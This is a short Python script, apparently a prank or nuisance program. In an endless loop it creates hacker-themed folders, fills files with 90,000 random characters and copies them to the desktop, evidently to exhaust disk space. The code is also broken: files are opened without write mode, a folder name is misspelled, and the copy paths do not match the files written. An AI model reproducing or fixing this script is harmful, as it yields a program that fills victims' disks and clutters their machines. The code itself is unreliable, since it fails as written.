import os 
import random
import shutil
import string

while True:
    os.makedirs("DarkParasites" , exist_ok=True)
    with open(f"DarkParisites/bypass.txt") as arquivo:
         for _ in range(90000):
              arquivo.write(random.choice(string.ascii_letters + string.digits))

    origem = "bypass.txt"
    destino = 'Desktop/'
    shutil.copy(origem, destino)

    os.makedirs("Th3_g3ntl3m4n" , exist_ok=True)
    with open(f"Th3_g3ntl3m4n/t@nd3r@") as arquivo:
         for _ in range(90000):
              arquivo.write(random.choice(string.ascii_letters + string.digits))

    origem_two = "t@nd3r@"
    shutil.copy(origem_two, destino)

    os.makedirs("J0aninh@s" , exist_ok=True)
    with open(f"J0aninh@s/fsociety") as arquivo:
         for _ in range(90000):
              arquivo.write(random.choice(string.ascii_letters + string.digits))
    origem_three = "fsociety"
    shutil.copy(origem_three, destino)


    
    

